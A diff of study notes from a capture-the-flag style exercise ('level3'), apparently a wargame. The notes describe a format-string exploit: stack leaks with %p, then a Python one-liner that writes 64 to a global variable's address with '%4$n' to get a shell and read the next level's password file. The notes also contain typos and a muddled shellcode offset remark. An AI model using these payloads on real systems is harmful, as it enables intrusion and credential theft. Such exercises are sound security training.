@@ -1,29 +1,33 @@
-- attack: format string exploitation
-- binary behavior: reprints argument, if global argument = 64 run he shell
+- attack: format string exploitation (adress leaks)
+- binary behavior: gets gets argument and send it to printf, if global argument = 64 run the shell
 - targeted functions: v and main
-- vulnerability in v: printf() without specification
+- vulnerability in v: printf() without argument (Bugs section in printf man)
 - defense: fget
 
 Method:
-- find the buffer adress
-- find the return address used by strdup
-- overwrite eip by the return address
-- call shell using shellcode
-- cat passwd when get console with root privedges
+- do stack leakage
+- find in leakage the position of the buffer 
+- find the global variable (password)
+- overwrite buffer with address of global variable 
+- and pass 64 as its value
  
 Info:
-- 0x804988c - global variable
+- poisiton of buffer in stack - 4
+
+- 0x804988c - address global variable
 - 8c980408 - same in little-endian
 - same in hex - \x8c\x98\x04\x08
+- the password - 0x40 or 64
 
-- eip register address after segfault - 0x37634136
-- its offset - 80 (from wiremask.eu)
-- offset code structure: 80 = 4 (return address) + 52 (shell code) + 28
+- offset code structure: 64 = 4 (global variable address) + 60 (shell code)
 
 
 Code:
 objdump -d ./level3
-ltrace ./level3
+ ./level3
+%p %p %p %p %p
+(python -c 'print "\x8c\x98\x04\x08 %x %x %x %x"';cat) | ./level3
+(python -c 'print "\x8c\x98\x04\x08" + "A" * 60 + "%4$n"'; echo "cd ..; cat level4/.pass") | ./level3
 
 cd ..; cat level4/.pass
 
